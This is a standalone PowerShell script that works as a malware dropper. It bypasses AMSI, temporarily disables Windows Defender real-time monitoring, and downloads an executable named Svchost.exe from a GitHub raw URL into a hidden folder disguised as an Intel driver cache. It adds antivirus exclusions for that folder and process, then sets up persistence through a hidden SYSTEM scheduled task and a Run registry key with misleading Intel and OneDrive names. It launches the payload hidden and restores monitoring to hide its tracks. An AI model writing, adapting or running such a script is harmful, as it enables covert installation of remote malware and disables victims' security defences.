try {
    # AMSI
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
} catch {}

Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue

$folder = "$env:ProgramData\Intel\DriverCache"
New-Item -ItemType Directory -Path $folder -Force -ErrorAction SilentlyContinue | Out-Null
Set-ItemProperty -Path $folder -Name Attributes -Value "Hidden" -ErrorAction SilentlyContinue

$name = -join ((65..90) | Get-Random -Count 8 | %{[char]$_}) + ".exe"
$path = Join-Path $folder $name

try {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile("https://raw.githubusercontent.com/tanish-king/updater/main/Svchost.exe", $path)
    if (!(Test-Path $path)) { exit }
} catch { exit }

Set-ItemProperty -Path $path -Name Attributes -Value "Hidden" -ErrorAction SilentlyContinue

Add-MpPreference -ExclusionPath $folder -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess $name -ErrorAction SilentlyContinue

# Task
$action = New-ScheduledTaskAction -Execute $path
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -Hidden
Register-ScheduledTask -TaskName "IntelDriverUpdate" -Action $action -Principal $principal -Trigger $trigger -Settings $settings -Force | Out-Null

# Registry
$reg = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $reg -Name "OneDriveUpdate" -Value $path -Force -ErrorAction SilentlyContinue

Start-Process -FilePath $path -WindowStyle Hidden -ErrorAction SilentlyContinue

Start-Sleep -Seconds 25
Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue

# Cleanup
exit
